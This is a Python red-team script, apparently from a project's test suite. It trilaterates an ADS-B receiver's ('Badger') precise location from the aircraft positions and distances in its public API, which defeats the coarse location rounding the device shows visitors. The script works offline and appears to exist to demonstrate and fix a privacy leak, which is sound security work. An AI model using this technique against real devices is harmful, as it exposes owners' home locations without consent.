#!/usr/bin/env python3
"""
Attack script: recover a Badger's position from its public aircraft list.

GET /api/aircraft (access "public": anyone on the Wi-Fi, no account) returns, for every plane,
its exact position (lat/lon to 5 decimals, ~1 m) and its distance from the Badger (0.1 km) —
three planes are enough to solve for the Badger's own position to ~100 m, while /api/status
rounds that position to ~11 km for visitors.

    python3 tests/redteam/trilaterate.py aircraft.json     # a saved /api/aircraft reply

Standard library only. Offline: it never contacts a Badger by itself.
"""
from __future__ import annotations

import json
import math
import sys

R = 6371.0088


def _xy(lat, lon, lat0, lon0):
    """Local flat-earth km around (lat0, lon0) — fine for the ~400 km an ADS-B receiver hears."""
    x = math.radians(lon - lon0) * R * math.cos(math.radians(lat0))
    y = math.radians(lat - lat0) * R
    return x, y


def _haversine(a_lat, a_lon, b_lat, b_lon):
    p1, p2 = math.radians(a_lat), math.radians(b_lat)
    dp, dl = p2 - p1, math.radians(b_lon - a_lon)
    h = math.sin(dp / 2) ** 2 + math.cos(p1) * math.cos(p2) * math.sin(dl / 2) ** 2
    return 2 * R * math.asin(min(1.0, math.sqrt(h)))


def solve(planes: list[dict], start: tuple[float, float] | None = None, iters: int = 60) -> tuple[float, float]:
    """planes: [{"lat", "lon", "dist_km"}…] → (lat, lon) minimising the distance residuals
    (Gauss-Newton on haversine with a numerical Jacobian)."""
    pts = [p for p in planes if all(isinstance(p.get(k), (int, float)) for k in ("lat", "lon", "dist_km"))]
    if len(pts) < 3:
        raise ValueError("need at least three planes with a position and a distance")
    lat = start[0] if start else sum(p["lat"] for p in pts) / len(pts)
    lon = start[1] if start else sum(p["lon"] for p in pts) / len(pts)
    for _ in range(iters):
        jtj = [[0.0, 0.0], [0.0, 0.0]]
        jtr = [0.0, 0.0]
        eps = 1e-5
        for p in pts:
            r = _haversine(lat, lon, p["lat"], p["lon"]) - p["dist_km"]
            dlat = (_haversine(lat + eps, lon, p["lat"], p["lon"]) - _haversine(lat - eps, lon, p["lat"], p["lon"])) / (2 * eps)
            dlon = (_haversine(lat, lon + eps, p["lat"], p["lon"]) - _haversine(lat, lon - eps, p["lat"], p["lon"])) / (2 * eps)
            j = (dlat, dlon)
            for a in range(2):
                jtr[a] += j[a] * r
                for b in range(2):
                    jtj[a][b] += j[a] * j[b]
        det = jtj[0][0] * jtj[1][1] - jtj[0][1] * jtj[1][0]
        if abs(det) < 1e-18:
            break
        step_lat = (jtj[1][1] * jtr[0] - jtj[0][1] * jtr[1]) / det
        step_lon = (-jtj[1][0] * jtr[0] + jtj[0][0] * jtr[1]) / det
        lat, lon = lat - step_lat, lon - step_lon
        if abs(step_lat) < 1e-9 and abs(step_lon) < 1e-9:
            break
    return lat, lon


def from_reply(reply: dict) -> tuple[float, float]:
    planes = reply.get("aircraft") or []
    origin = reply.get("origin") or None
    return solve(planes, (origin["lat"], origin["lon"]) if origin else None)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        sys.exit(__doc__)
    with open(sys.argv[1]) as fh:
        lat, lon = from_reply(json.load(fh))
    print(f"Badger is at about {lat:.5f}, {lon:.5f}")
